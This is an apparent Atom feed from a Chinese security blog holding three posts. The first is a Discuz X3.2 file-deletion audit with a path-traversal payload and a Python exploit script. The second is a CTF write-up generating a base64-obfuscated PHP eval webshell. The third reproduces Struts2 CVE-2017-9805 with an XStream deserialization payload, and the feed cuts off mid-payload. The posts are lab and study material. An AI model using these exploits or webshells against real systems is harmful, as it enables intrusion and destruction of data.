<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ct10n&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-10-22T04:46:33.607Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>4ct10n</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Discuz x 3.2 漏洞分析</title>
    <link href="http://yoursite.com/2017/10/22/Discuz%20x%203.2%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/10/22/Discuz x 3.2 漏洞分析/</id>
    <published>2017-10-22T04:46:33.615Z</published>
    <updated>2017-10-22T04:46:33.607Z</updated>
    
    <content type="html"><![CDATA[<p>审计最近出来的Discuz 的漏洞<br><a id="more"></a></p><h1 id="0x01-爬坑"><a href="#0x01-爬坑" class="headerlink" title="0x01 爬坑"></a>0x01 爬坑</h1><p>注册和登录都需要输入验证码吗，但根本没有要输入的地方，而且连图片也没有<br>第一步就是绕过验证</p><h2 id="0x1-登录"><a href="#0x1-登录" class="headerlink" title="0x1 登录"></a>0x1 登录</h2><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2014-03-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""><br>这里需要改一下</p><h2 id="0x2-注册"><a href="#0x2-注册" class="headerlink" title="0x2 注册"></a>0x2 注册</h2><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2014-14-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""><br>把第一个true改为false</p><h1 id="0x02-漏洞定位"><a href="#0x02-漏洞定位" class="headerlink" title="0x02 漏洞定位"></a>0x02 漏洞定位</h1><p>首先漏洞的发现过程是循序渐进的,有什么需要做什么都是一步一步来的</p><p>下面定位文件删除的漏洞点</p><p>可以利用现成的代码审计工具,这里我们利用rips<br>将代码定位到</p><p>source/include/spacecp/spacecp_profile.php</p><p>这里有好几处触发点我们一个一个分析其可能性</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-01-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>首先提交</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-27-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>验证第一个漏洞,这里之所以用profilesubmit和formhash是通过phpstorm动态调试出来的,如下图</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-29-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>发现有一个点绕不过去,就是type==file,所以另寻它法</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-01-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""><br>这里只需要上传文件成功便可执行删除文件操作,所以这一点比较好绕过</p><h1 id="0x03-代码回溯"><a href="#0x03-代码回溯" class="headerlink" title="0x03 代码回溯"></a>0x03 代码回溯</h1><p>有了删除操作,那么怎么将文件名可控呢,发现文件名为$space[$key]<br>loadcache会加载$space变量,如果里面有新值那么就可以update信息</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-39-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-42-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>那么在这里直接执行下图数据,就可以修改成任意文件名</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-45-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><h1 id="0x04-删除文件"><a href="#0x04-删除文件" class="headerlink" title="0x04 删除文件"></a>0x04 删除文件</h1><p>万事具备只欠文件:smile: 下面是删除文件的操作<br>还记得回溯前的推理吗</p><p>只需提交一个文件就可以将现有的文件删除啦<br>看一下现有的文件路径</p><p><img src="/2017/10/22/Discuz x 3.2 漏洞分析/2017-10-21%2021-50-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""><br>data/attachment/profile/目录下<br>只需../../../就可以删除根目录文件了(当然我们可以给文件加上权限)</p><h1 id="0x05-综合利用"><a href="#0x05-综合利用" class="headerlink" title="0x05 综合利用"></a>0x05 综合利用</h1><p>首先利用改文件名,将文件名改为../../../xxx</p><p><code>home.php?mod=spacecp&amp;ac=profile&amp;op=base</code><br><code>POST birthprovince=../../../test.txt&amp;profilesubmit=1&amp;formhash=b7ef819d</code></p><p>其次利用文件上传将原有文件删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"http://127.0.0.1/Discuz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;XDEBUG_SESSION_START=1"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line"></div><div class="line">&lt;input type=<span class="string">"file"</span> name=<span class="string">"birthprovince"</span> id=<span class="string">"file"</span> /&gt;</div><div class="line"></div><div class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"formhash"</span> value=<span class="string">"b7ef819d"</span>/&gt;&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"profilesubmit"</span> value=<span class="string">"1"</span>/&gt;&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</div><div class="line"></div><div class="line">&lt;/from&gt;</div></pre></td></tr></table></figure><h1 id="0x06-脚本编写"><a href="#0x06-脚本编写" class="headerlink" title="0x06 脚本编写"></a>0x06 脚本编写</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line">res = requests.session()</div><div class="line">base = <span class="string">'http://127.0.0.1/Discuz/upload/'</span></div><div class="line">extend = <span class="string">'member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes'</span></div><div class="line"></div><div class="line">data = &#123;</div><div class="line">    <span class="string">'username'</span>:<span class="string">'action'</span>,</div><div class="line">    <span class="string">'password'</span>:<span class="string">'action'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">r = res.post(base+extend,data=data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># get hashvalue</span></div><div class="line">extend = <span class="string">'home.php?mod=spacecp'</span></div><div class="line">r = res.post(base+extend)</div><div class="line">soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>, from_encoding=<span class="string">'utf-8'</span>)</div><div class="line">strs = soup.find_all(<span class="string">'input'</span>,attrs=&#123;<span class="string">'name'</span>:<span class="string">'formhash'</span>&#125;)[<span class="number">0</span>]</div><div class="line">hashcode = strs[<span class="string">'value'</span>]</div><div class="line"><span class="keyword">print</span> hashcode</div><div class="line"></div><div class="line"><span class="comment"># alter birthprivence</span></div><div class="line"></div><div class="line">extend = <span class="string">'home.php?mod=spacecp'</span></div><div class="line">data = &#123;</div><div class="line">    <span class="string">'profilesubmit'</span>:<span class="string">'1'</span>,</div><div class="line">    <span class="string">'birthprovince'</span>:<span class="string">'../../../1.txt'</span>,</div><div class="line">    <span class="string">'formhash'</span>:hashcode</div><div class="line">&#125;</div><div class="line">r = res.post(base+extend,data=data)</div><div class="line"></div><div class="line"><span class="comment"># delete file named blablabla</span></div><div class="line"></div><div class="line"></div><div class="line">extend = <span class="string">'home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;XDEBUG_SESSION_START=1'</span></div><div class="line">data = &#123;</div><div class="line">    <span class="string">'formhash'</span>:hashcode,</div><div class="line">    <span class="string">'profilesubmit'</span>:<span class="string">'1'</span></div><div class="line">&#125;</div><div class="line">files = &#123;</div><div class="line">    <span class="string">'birthprovince'</span>:(<span class="string">'4ct10n.jpg'</span>,open(<span class="string">'/home/yz/图片/33.png'</span>,<span class="string">'rb'</span>),<span class="string">"image/jpeg"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line">res.post(base+extend,data=data,files=files)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;审计最近出来的Discuz 的漏洞&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>2017 XDCTF  Upload</title>
    <link href="http://yoursite.com/2017/10/06/2017%20XDCTF%20%20Upload/"/>
    <id>http://yoursite.com/2017/10/06/2017 XDCTF  Upload/</id>
    <published>2017-10-05T16:46:00.000Z</published>
    <updated>2017-10-22T02:14:21.259Z</updated>
    
    <content type="html"><![CDATA[<p>比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下</p><br><h1 id="0x01-base64-little-trick">0x01 base64 little trick</h1><br><p>在base64解码的时候其他多余字符是自动被忽略的 <br><br>例如下图<br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20171006002338596?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h1 id="0x02-文件上传分析">0x02 文件上传分析</h1><br><p>上传的文件我们可以看出过滤了大部分字符，只有actgACTG没有被过滤 <br><br>猜想是利用这几个字符构造webshell，但是当时不知道小trick所以没有想到写脚本。<br></p><br><h1 id="0x03-脚本编写">0x03 脚本编写</h1><br><p>根据base64的小trick，写一个通用的脚本达到任意几个字符就可以构造webshell的目的</p><br><p>下面来分析一下脚本的编写</p><br><p>实现的过程是这样的，因为base64是四字节对齐所以我们用4字节进行全排列，然后解码找出只有一个合法字符的原字符串（生成字典），直到遍历完全排列的字符串，去掉值重复的值，本轮结束，查看有没有包含shellcode所需要的所有字符如果有直接输出。没有继续重复上述操作，并在接下来的每一步的最后来一个字符串映射。</p><br><p>具体脚本如下：</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sets<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutation</span><span class="hljs-params">(strs)</span>:</span><br>    strings = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(strs,<span class="hljs-number">4</span>):<br>        s = <span class="hljs-string">‘’</span>.join(i)<br>        strings.append(s)<br>    <span class="hljs-keyword">return</span> strings<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dic</span><span class="hljs-params">(strs)</span>:</span><span class="hljs-comment">#1 利用字符串创造字典</span><br>    dic =  {i:base64.b64decode(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permutation(strs)}<br>    <span class="hljs-keyword">return</span> dic<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clac_shouldbe</span><span class="hljs-params">(dic)</span>:</span><span class="hljs-comment">#2 筛选字典中value的值留下只有一个合法字符的键值对</span><br>    <span class="hljs-comment"># print dic</span><br>    new = {}<br>    should_be = string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="hljs-string">‘=’</span>+<span class="hljs-string">‘/‘</span>+<span class="hljs-string">‘+’</span><br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic:<br>        set1 = sets.Set(should_be)<br>        set2 = sets.Set(dic[key])<br>        Intersect = <span class="hljs-string">‘’</span>.join(set1 &amp; set2)<br>        <span class="hljs-keyword">if</span> len(Intersect) == <span class="hljs-number">1</span>:<br>            new[key]=Intersect<br>    <span class="hljs-keyword">return</span> new<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove_Dup</span><span class="hljs-params">(dic)</span>:</span><span class="hljs-comment">#3 去value重复的键值对</span><br>    mid = {dic[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic}<br>    dic = {mid[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> mid}<br>    <span class="hljs-keyword">return</span> dic<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new_strs</span><span class="hljs-params">(dic)</span>:</span><span class="hljs-comment">#去重之后生成新的字符串</span><br>    s = <span class="hljs-string">‘’</span><br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic:<br>        s += dic[key]<br>    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-string">‘=’</span>,<span class="hljs-string">‘’</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strs_replaces</span><span class="hljs-params">(dic1,dic2)</span>:</span><span class="hljs-comment">#4 字符串映射 </span><br>    revs = {dic1[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic1}<br>    <span class="hljs-keyword">return</span> {revs[key[<span class="hljs-number">0</span>]]+revs[key[<span class="hljs-number">1</span>]]+revs[key[<span class="hljs-number">2</span>]]+revs[key[<span class="hljs-number">3</span>]]:dic2[key] <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic2}<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_already</span><span class="hljs-params">(str1,str2)</span>:</span><span class="hljs-comment">#判断时候全部包含shellcode所需要的值</span><br><br>    set1 = sets.Set(str1)<br>    set2 = sets.Set(str2)<br>    Intersect = <span class="hljs-string">‘’</span>.join(set1 &amp; set2)<br><br>    <span class="hljs-comment"># print Intersect</span><br><br>    <span class="hljs-keyword">if</span>(len(Intersect) == len(set1)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><br>shell = <span class="hljs-string">“&lt;?php eval($_GET[a]);?&gt;”</span><br>shell = base64.b64encode(shell)<br>shell_base = <span class="hljs-string">‘PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4=’</span><br><br>strs = <span class="hljs-string">‘1234’</span><br><span class="hljs-comment">#strings what you want to make up shellcode with</span><br><br><br><br>dic = remove_Dup(clac_shouldbe(create_dic(strs)))<br>strs = new_strs(dic)<br><span class="hljs-comment"># print dic</span><br><span class="hljs-comment">#create nonredundant value of dict ,once to decode</span><br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">“Has based “</span>+str(i) +<span class="hljs-string">‘ times ‘</span><br>    dic1 = remove_Dup(clac_shouldbe(create_dic(strs)))<br>    strs = new_strs(dic1)<br>    dic = strs_replaces(dic,dic1)<br>    <span class="hljs-comment"># print dic</span><br>    <span class="hljs-keyword">if</span> test_already(shell_base,strs+<span class="hljs-string">‘=’</span>):<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“Has based “</span>+str(i+<span class="hljs-number">1</span>) +<span class="hljs-string">‘ times ,you have decode ‘</span>+str(i+<span class="hljs-number">1</span>+<span class="hljs-number">1</span>)+<span class="hljs-string">‘ times ‘</span><br><br><br>revs = {dic[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic}<br><span class="hljs-keyword">print</span> <span class="hljs-string">‘++++++++++++++++++++++++\n’</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">‘’</span>.join(revs[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> shell_base)<br></code></pre><br><h1 id="0x04-测试">0x04 测试</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20171006004324727?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20171006004452502?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h1 id="0x05-总结">0x05 总结</h1><br><p>确实是一个巧妙的方法，有学习了一个姿势</p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="write-up" scheme="http://yoursite.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-9805（Struts2 漏洞复现与分析）</title>
    <link href="http://yoursite.com/2017/09/07/CVE-2017-9805%EF%BC%88Struts2%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://yoursite.com/2017/09/07/CVE-2017-9805（Struts2 漏洞复现与分析）/</id>
    <published>2017-09-07T14:00:00.000Z</published>
    <updated>2017-10-22T02:14:21.643Z</updated>
    
    <content type="html"><![CDATA[<p>前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。0x01 漏洞简介漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。  Struts2 REST插件的XStre<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。</p><br><h1 id="0x01-漏洞简介">0x01 漏洞简介</h1><br><p>漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。  Struts2 REST插件的XStream组件存在反序列化漏洞，使用带有 XStream实例的 XStreamHandler进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。   </p><br><h1 id="0x02-环境搭建">0x02 环境搭建</h1><br><table><br><thead><br><tr><br><th>env</th><br><th>版本</th><br></tr><br></thead><br><tbody><tr><br><td>docker</td><br><td>16.04</td><br></tr><br><tr><br><td>jdk</td><br><td>1.8.0_144</td><br></tr><br><tr><br><td>struts源码</td><br><td>2.5.12</td><br></tr><br><tr><br><td>tomcat</td><br><td>8.0.46</td><br></tr><br></tbody></table><br><p>直接从官网下载相对应的源码</p><br><h2 id="0x1-dockerfile">0x1 dockerfile</h2><br><pre class="prettyprint"><code class=" hljs lasso">FROM ubuntu:<span class="hljs-number">16.04</span><br><br>MAINTAINER <span class="hljs-number">4</span>t10n <span class="hljs-subst">&lt;</span>act01n@<span class="hljs-number">163.</span>com<span class="hljs-subst">&gt;</span><br>ENV DEBIAN_FRONTEND noninteractive<br><br>RUN sed <span class="hljs-attribute">-i</span> <span class="hljs-string">‘s/archive.ubuntu.com/mirrors.ustc.edu.cn/g’</span> /etc/apt/sources<span class="hljs-built_in">.</span><span class="hljs-built_in">list</span><br><br>RUN apt<span class="hljs-attribute">-get</span> update <span class="hljs-attribute">-y</span> <span class="hljs-subst">\</span><br>    <span class="hljs-subst">&amp;&amp;</span> apt<span class="hljs-attribute">-get</span> install unzip<span class="hljs-subst">\</span><br>    <span class="hljs-subst">&amp;&amp;</span> apt<span class="hljs-attribute">-get</span> install net<span class="hljs-attribute">-tools</span><br><br><br>WORKDIR /tmp<br>COPY  <span class="hljs-built_in">.</span>/apache<span class="hljs-attribute">-tomcat</span><span class="hljs-subst">-</span><span class="hljs-number">8.0</span><span class="hljs-number">.46</span><span class="hljs-built_in">.</span>tar<span class="hljs-built_in">.</span>gz  /tmp<span class="hljs-subst">/</span><br>COPY  <span class="hljs-built_in">.</span>/jdk<span class="hljs-built_in">.</span>tar<span class="hljs-built_in">.</span>gz  /tmp<span class="hljs-subst">/</span><br>COPY  <span class="hljs-built_in">.</span>/struts<span class="hljs-built_in">.</span>zip  /tmp<span class="hljs-subst">/</span><br>COPY  <span class="hljs-built_in">.</span>/cmd<span class="hljs-built_in">.</span>sh  /tmp<span class="hljs-subst">/</span><br>RUN  chmod a<span class="hljs-subst">+</span>x cmd<span class="hljs-built_in">.</span>sh<br><br><br>EXPOSE <span class="hljs-number">8080</span><br><br>CMD <span class="hljs-preprocessor">[</span><span class="hljs-string">“/bin/bash”</span>,<span class="hljs-string">“/tmp/cmd.sh”</span><span class="hljs-preprocessor">]</span><span class="hljs-markup"><br></span></code></pre><br><p>cmd.sh</p><br><pre class="prettyprint"><code class=" hljs avrasm">tar -xz -f jdk<span class="hljs-preprocessor">.tar</span><span class="hljs-preprocessor">.gz</span> -C /usr/local/<br>tar -xz -f apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span><span class="hljs-preprocessor">.tar</span><span class="hljs-preprocessor">.gz</span> -C /usr/local/<br>unzip struts<span class="hljs-preprocessor">.zip</span> -d /usr/local/apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span>/webapps<br><br>mv /usr/local/apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span>/webapps/struts-<span class="hljs-number">2.5</span><span class="hljs-number">.12</span>/apps/struts2-rest-showcase<span class="hljs-preprocessor">.war</span> ./../../<br><span class="hljs-preprocessor"># setup jdk</span><br>echo <span class="hljs-string">‘’’</span><br>JAVA_HOME=/usr/local/jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0</span>_144<br>JAVA_BIN=/usr/local/jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0</span>_144/bin<br>PATH=$PATH:$JAVA_BIN<br>CLASSPATH=$JAVA_HOME/lib/dt<span class="hljs-preprocessor">.jar</span>:$JAVA_HOME/lib/tools<span class="hljs-preprocessor">.jar</span><br>export JAVA_HOME JAVA_BIN PATH CLASSPATH<br><span class="hljs-string">‘’’</span>&gt;&gt;/etc/profile<br>source /etc/profile<br>/usr/local/apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span>/bin/startup<span class="hljs-preprocessor">.sh</span><br><br>/bin/bash<br></code></pre><br><p>相关源码在<a href="https://github.com/actionyz/vulhub" target="_blank" rel="external">Github</a>上</p><br><h2 id="0x2-攻击代码">0x2 攻击代码</h2><br><p>这里只是生成一个文件4ct10n</p><br><pre class="prettyprint"><code class=" hljs http"><span class="hljs-request">POST <span class="hljs-string">/struts2-rest-showcase/orders/3</span> HTTP/1.1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-string">192.168.43.165:8989</span><br><span class="hljs-attribute">User-Agent</span>: <span class="hljs-string">Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="hljs-attribute">Accept</span>: <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</span><br><span class="hljs-attribute">Accept-Language</span>: <span class="hljs-string">en-US,en;q=0.5</span><br><span class="hljs-attribute">Accept-Encoding</span>: <span class="hljs-string">gzip, deflate</span><br><span class="hljs-attribute">Referer</span>: <span class="hljs-string"><a href="http://192.168.43.165:8989/struts2-rest-showcase/orders/3/edit" target="_blank" rel="external">http://192.168.43.165:8989/struts2-rest-showcase/orders/3/edit</a></span><br><span class="hljs-attribute">Cookie</span>: <span class="hljs-string">JSESSIONID=31A64A6CF6021DA63449D6DDEF10202F</span><br><span class="hljs-attribute">Connection</span>: <span class="hljs-string">close</span><br><span class="hljs-attribute">Content-Type</span>: <span class="hljs-string">application/xml</span><br><span class="hljs-attribute">Content-Length</span>: <span class="hljs-string">1656</span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-title">map</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">entry</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">flags</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">value</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">dataHandler</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">dataSource</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">is</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“javax.crypto.CipherInputStream”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">cipher</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“javax.crypto.NullCipher”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">initialized</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">opmode</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">serviceIterator</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“javax.imageio.spi.FilterIterator”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">iter</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“javax.imageio.spi.FilterIterator”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">iter</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“java.util.Collections$EmptyIterator”</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">next</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“java.lang.ProcessBuilder”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">command</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">string</span>&gt;</span>/usr/bin/touch<span class="hljs-tag">&lt;/<span class="hljs-title">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">string</span>&gt;</span>/home/4ct10n<span class="hljs-tag">&lt;/<span class="hljs-title">string</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">command</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">redirectErrorStream</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">next</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">iter</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">filter</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“javax.imageio.ImageIO$ContainsFilter”</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">method</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-title">class</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">parameter-types</span>/&gt;</span> <span 